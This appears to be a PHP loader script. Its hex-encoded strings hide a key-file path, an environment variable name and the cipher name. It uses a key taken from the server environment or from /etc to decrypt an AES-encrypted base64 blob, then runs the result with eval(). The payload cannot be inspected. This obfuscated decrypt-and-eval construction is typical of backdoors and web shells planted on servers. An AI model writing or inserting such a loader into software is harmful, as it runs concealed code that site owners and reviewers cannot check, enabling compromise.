<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('iREIaoAbNZTlnBq2nPAqfA==');

$c=base64_decode(

'm2lqzkQ1WOzF9V7tGkijsn9twyHmajlp6lEAnz8dlz4vjYlGIWG9pTQPXEkhHub8ibmxILKO72qs' .
'TOYyZ6YZ0smImA8OukGxacxFdXPX20vEHaVNBdm08/OLbO4XV6H7HpybBUqdwJ8F/w1jH3YnNjGR' .
'abhyDXMOxZwGCP0mYMA2Tg7icUv9QHlOJBhVuE/m1ZwL88iC8hV8sEn3jHLgSjaRwCc3Y2GifYeT' .
'aQpZbDblMPR3O2VCivl3gco/NLPDetWMmPO9LRoVNmpDA4t2Lld7QOgJCQExaSZKqGIHp4UD5UTw' .
'n8W7dhnsyM+GnMsPBujc2q1oBeDqWF9eJn1KYWQwj2pQ8WGzjDdkirA7YC92YsMxplwpNtZ8/kH9' .
'0pQFVs1ghF8D4jh2OGbzFJ0wF6bfVRMEAc8vc6DXU2co++13EXSnVORAsfMBrQKKzDI0N7msJAXH' .
'pDZggJki918sb6h+R93mhinWN4FkgElraVZnS8tjQd4FNnLWgB4eMy8HneL9U44Dk3QlnUtwi1XX' .
'm1xXeIs659mvgd0RSJhRp8FfcwwjA3o/DMkaH86ruB51UEK3W0JEbWhA0+VvTwx6k8VdAhAc72Hx' .
'IlULDF1oYZCDTR3leLDZdeKsLPtsuXFE8+JDSt/Ipk2TLUFneh3y26hLgvaQzAPKvZWulmbhJK57' .
'wp8IE2nTmBWPCAG+CKotNOLVfXte29s1nzxbtiGASg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

